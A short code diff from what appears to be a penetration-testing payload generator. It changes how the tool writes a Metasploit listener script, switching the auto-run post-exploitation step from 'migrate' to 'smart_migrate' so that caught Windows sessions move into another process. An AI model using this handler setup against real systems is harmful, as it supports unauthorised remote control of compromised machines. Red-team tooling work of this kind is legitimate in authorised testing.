@@ -453,7 +453,7 @@ class Controller:
                     handler += "set LPORT " + parts[0] + "\n"
 
                 handler += "set ExitOnSession false\n"
-                handler += "set AutoRunScript post/windows/manage/migrate\n"
+                handler += "set AutoRunScript post/windows/manage/smart_migrate\n"
                 handler += "exploit -j\n"
 
             # print out any msfvenom options we used in shellcode generation if specified
@@ -519,7 +519,7 @@ class Controller:
                     handler += "set LPORT " + payload.required_options["LPORT"][0] + "\n"
 
                 handler += "set ExitOnSession false\n"
-                handler += "set AutoRunScript post/windows/manage/migrate\n"
+                handler += "set AutoRunScript post/windows/manage/smart_migrate\n"
                 handler += "exploit -j\n"
 
         message += "\n Payload File:\t\t"+OutputFileName + "\n"
